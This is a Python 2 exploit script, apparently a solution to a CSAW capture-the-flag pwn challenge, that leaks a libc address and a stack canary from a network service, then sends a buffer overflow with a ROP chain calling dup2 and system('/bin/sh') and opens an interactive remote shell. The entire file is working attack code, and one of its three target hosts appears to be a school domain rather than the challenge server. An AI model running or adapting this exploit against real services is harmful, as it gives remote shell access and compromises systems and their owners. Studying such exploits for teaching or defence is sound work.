#!/usr/bin/python
# encoding: utf-8
import random
import sys
import socket
import string
import base64
import time
import os
import re
import select
VERBOSE=1
WITHRET=False
OVER=312
if (sys.argv[1]=="0"):
    TIME=0.02
elif(sys.argv[1]=="1"):
    TIME=0.1
else:
    TIME=0.3
DECALAGE=0x1000
LONGUEUR=0x4000
REPONSE_VALABLE="AAAAAAAAAAAA"
Fileout=4

def adr_to_str16(add):
    a = hex(add + 0x1000000000000000)
    ret  = chr(int(a[16:18], 16))
    ret += chr(int(a[14:16], 16))
    ret += chr(int(a[12:14], 16))
    ret += chr(int(a[10:12], 16))
    return ret

def str16_to_adr(s,n=4):
        a=0
        for i in range(n-1,-1,-1):
                a=a*256+ord(s[i])
        return a

def adr_to_str32(add):
    ret=adr_to_str16(add%4294967296)+adr_to_str16(add//4294967296)
    return ret

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s=s+"0"
    return(s)

def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8):
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        if (num < 0):
            n=(-1)*num
            ps="-"
            num=-num
        else:
            n=num
            ps=""
        s=""
        while((nb>0) or (num != 0)):
                s=numerals[num % b]+s
                num=num//b
                nb=nb-1
        return ps+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s

def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)


def blword(t):
    p=1
    s=0
    for l in t:
        s=s+l*p
        p=p*256
    return(s)



def str_to_lst(s):
    l=[]
    for i in range(len(s)):
        l=l+[ord(s[i])]
    return(l)

def sort_hexa(s,n):
    print s,baseN(n,16,8)

def affiche(t):
    pile=[]
    for i in range((len(t)/8)):
        s=blword(t[8*i:8*(i+1)])
        print baseN(s,16,16),
        pile=pile+[s]
    print " "
    return(pile)

def affichent(t):
    pile=[]
    for s in t:
        print baseN(s,16,16),
        pile=pile+[s]
    print " "
    return(pile)

def lst_out(liste):
    for i in liste:
        print baseN(i,16,16),
    print " "
    
# return 0 on retriving good data, 1 on segfault, -1 in a blocking call .
def bigread(s,mot):
    b=""
    while(re.search(mot,b) == None):
        b=b+s.recv(1024)
    return(b)

def check_alive(sock):
        try:
                ready = select.select([sock], [], [], 0.1)
                if(ready[0]):
                        data = sock.recv(1024)
#                        print data
                        if(re.search(REPONSE_VALABLE, data) != None):
#                                print 0,
                                return 0
                        else:
#                                print -1
                                return 1
                else:
#                        print -2
                        return -1
        except:
#                print 1
                return 1

def alea(n):
    s=""
    for i in range(n):
        s=s+adr_to_str32(random.randint(0,2*RET))
    return(s)

def addgad(ch,adr):
    ch=ch+adr_to_str32(adr)
    return(ch)

CMD="/bin/sh"
ZERO=adr_to_str32(0)


if (sys.argv[1]=='0'):
    HOST = "localhost"
    PORT = 8002
    offset_dup2 = 0x00000000000dc490
    offset_system = 0x0000000000041490
    offset_sh=0x0000000000163708
    offset_puts = 0x000000000006b990

elif (sys.argv[1]=='1'):
    HOST = "pwn.chal.csaw.io"
    PORT = 8002
    offset_dup2 = 0x00000000000ebe90
    offset_system = 0x0000000000046590
    offset_sh=0x000000000017c8c3
    offset_puts = 0x000000000006fd60

else:
    HOST = "lycee-charlemagne.net"
    PORT = 8002
    offset_dup2 = 0x000d29b0
    offset_system = 0x00000003fc30
    offset_sh=0x0000000000046590f
    offset_puts = 0x0000000000068e90

def envoiexploit(e,s):
#    print "envoi de ",e
    readbuffer=bigread(s,'>')
    chaine="2\n"
    s.send(chaine)
    time.sleep(TIME)
    readbuffer=bigread(s,'>')
    chaine="A"*OVER+e+"\n"
    s.send(chaine)
    time.sleep(TIME)


s = socket.socket()
s.connect((HOST, PORT))
time.sleep(TIME)
readbuffer=bigread(s,'>')
print "(1)",readbuffer
chaine="1\n"
s.send(chaine)
time.sleep(TIME)
readbuffer=bigread(s,'>')
print "(2)",readbuffer
while (re.search("erence:",readbuffer)==None):
    time.sleep(TIME)
    readbuffer=s.recv(1024)
    print "(3)",readbuffer
PUTS=int(readbuffer[readbuffer.index('0x')+2:readbuffer.index("\n")],16)

s.close()




OVER=311
if OVER==0:
    cherche=True
    OVER=308
    while (cherche==True):
        s = socket.socket()
        s.connect((HOST, PORT))
        time.sleep(TIME)
#        envoiexploit("A"*OVER,s)
        readbuffer=bigread(s,'>')
        chaine="2\n"
        s.send(chaine)
        time.sleep(TIME)
        readbuffer=bigread(s,'>')
        chaine="A"*OVER+"\n"
        s.send(chaine)
        time.sleep(TIME)
        r=check_alive(s)
        print "O ",r,
        if (r<>0):
            OVER=OVER+1
        else:
            OVER=OVER-1
            cherche=False
        s.close()
        print OVER
    print "Overflow = ",OVER

OVER=311
s = socket.socket()
s.connect((HOST, PORT))
time.sleep(TIME)
#        envoiexploit("A"*OVER,s)
readbuffer=bigread(s,'>')
chaine="2\n"
s.send(chaine)
time.sleep(TIME)
readbuffer=bigread(s,'>')
print readbuffer,"(1)"
time.sleep(TIME)
chaine="A"*OVER+"\n"
s.send(chaine)
time.sleep(TIME)
scanari=bigread(s,'Tutorial')
dump(0,scanari)
print "(C)",scanari
scanari=scanari[0x138:0x140]
canari=bword(scanari)
s.close()
print "Canari=",baseN(canari,16,16)
TST=1
# test du canari
if (TST==0):
    for tst in range(-5,20):
        s = socket.socket()
        s.connect((HOST, PORT))
        time.sleep(TIME)
    #        envoiexploit("A"*OVER,s)
        readbuffer=bigread(s,'>')
        chaine="2\n"
        s.send(chaine)
        time.sleep(TIME)
        readbuffer=bigread(s,'>')
        chaine="A"*(OVER+tst)+scanari+"\n"
        s.send(chaine)
        time.sleep(TIME)
        r=check_alive(s)
        if (r <> 0):
            ENTETE="A"*(OVER+tst)+scanari
            print "entete trouvé"," ",len(ENTETE)
            break
        s.close()
    TST=tst
else:
    ENTETE="A"*(OVER+TST)+scanari
print len(ENTETE)

# bon après le canari, il y a RBP + RSP
POPRDI=0x00000000004012e3 # : pop rdi ; ret
POPRSIR15=0x00000000004012e1 # : pop rsi ; pop r15 ; ret

BASE_LIBC=PUTS -offset_puts+0x500
print "DUP2=",baseN(BASE_LIBC+offset_dup2,16)
print "SYSTEM=",baseN(BASE_LIBC+offset_system,16)
print"SH=",baseN(BASE_LIBC+offset_sh,16)

ENTETE="A"*(OVER+1)+scanari
payload=ENTETE

payload=addgad(payload,0x41414141414141)
payload=addgad(payload,POPRDI)
payload=addgad(payload,4)
payload=addgad(payload,POPRSIR15)
payload=addgad(payload,0)
payload=addgad(payload,0x41414141414141)
payload=addgad(payload,BASE_LIBC+offset_dup2)
payload=addgad(payload,POPRDI)
payload=addgad(payload,4)
payload=addgad(payload,POPRSIR15)
payload=addgad(payload,1)
payload=addgad(payload,0x41414141414141)
payload=addgad(payload,BASE_LIBC+offset_dup2)
#payload=addgad(payload,POPRDI)
#payload=addgad(payload,4)
#payload=addgad(payload,POPRSIR15)
#payload=addgad(payload,2)
#payload=addgad(payload,0x41414141414141)
#payload=addgad(payload,BASE_LIBC+offset_dup2)
payload=addgad(payload,POPRDI)
payload=addgad(payload,BASE_LIBC+offset_sh)
payload=addgad(payload,BASE_LIBC+offset_system)
dump(0,payload)
print "let's go?",
raw_input()
s = socket.socket()
s.connect((HOST, PORT))
time.sleep(TIME)
#        envoiexploit("A"*OVER,s)
readbuffer=bigread(s,'>')
print "(1)",readbuffer
chaine="2\n"
s.send(chaine)
time.sleep(TIME)
readbuffer=bigread(s,'>')
print (2),readbuffer
s.send(payload)
time.sleep(TIME)
print (3),bigread(s,'AAAA')
while(1):
    chaine=raw_input(">")
    print(chaine)
    s.send(chaine+" ; pwd\n")
    time.sleep(10*TIME)
    readbuffer=s.recv(4096)
    print "(*)",readbuffer

